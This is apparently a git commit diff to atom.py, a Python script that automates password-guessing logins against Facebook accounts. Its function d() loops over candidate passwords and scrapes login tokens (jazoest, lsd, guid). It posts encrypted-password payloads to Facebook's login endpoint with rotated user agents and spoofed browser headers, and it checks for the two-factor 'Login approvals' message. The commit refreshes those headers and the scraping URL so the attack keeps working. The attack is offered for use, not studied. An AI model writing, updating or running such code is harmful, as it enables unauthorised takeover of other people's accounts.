877413f352ad9f696008567093f0609d134939e3
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-10-03 11:28:42 +0530

    Update atom.py

--- atom.py
+++ atom.py
@@ -1763,7 +1763,7 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://www.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com/login.php').text
             data = {'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 'email': uid,
@@ -1775,36 +1775,33 @@ def d(uid,pwx,tl):
 'locale': 'bn_IN',
 'login_source': 'login_bluebar',
 'guid': re.search('name="guid" value="(.*?)"', str(free_fb)).group(1),
-'prefill_contact_point': '8389066877',
+'prefill_contact_point': uid,
 'prefill_source': 'browser_dropdown',
 'prefill_type': 'contact_point',
 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)}
-            headers = {
-            'Host': 'www.facebook.com',
-            'x-fb-rlafr': '0',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v8.0',
-            'strict-transport-security': 'max-age=15552000; preload',
-            'pragma': 'no-cache',
-            'cache-control': 'max-age=0',
-            'x-fb-debug': 'RW01gY 2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqViOLMUgCHNzLdLS+51v1LnRgplESoVeUHK j4pMGYJWZrDACA==',
-            'content-length': '0',
-            'sec-ch-ua': 'Not A; Br and"; v="99", "Chromium"; v="98"',
-            'sec-ch-ua-mobile': '0',
-            'sec-ch-ua-platform': '"Android"',
-            'save-data': 'on',
-            'upgrade-insecure-requests': '1',
-            'origin': 'https://www.facebook.com',
-            'content-type': 'application/x-www-form-urlencoded',
-            'user-agent':ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.9',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-user': '71',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3d0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3d0%26logger_id%3dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
-            'accept-encoding': 'gzip, deflate',
-            'accept-language': 'id-ID, id;q=0.9, en-GB;q=0.8, en;q=0.7,en-US;q=0.6'}
+            headers ={
+'authority': 'www.facebook.com',
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+'accept-language': 'en-US,en;q=0.9',
+'cache-control': 'max-age=0',
+'content-type': 'application/x-www-form-urlencoded',
+'dpr': '1',
+'origin': 'https://www.facebook.com',
+'referer': 'https://www.facebook.com/login.php',
+'sec-ch-prefers-color-scheme': 'light',
+'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
+'sec-ch-ua-full-version-list': '"Chromium";v="122.0.6261.129", "Not(A:Brand";v="24.0.0.0", "Microsoft Edge";v="122.0.2365.92"',
+'sec-ch-ua-mobile': '?0',
+'sec-ch-ua-model': '""',
+'sec-ch-ua-platform': '"Windows"',
+'sec-ch-ua-platform-version': '"10.0.0"',
+'sec-fetch-dest': 'document',
+'sec-fetch-mode': 'navigate',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-user': '?1',
+'upgrade-insecure-requests': '1',
+'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
+'viewport-width': '511'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
             po = Session.post(url, data=data, headers=headers).text
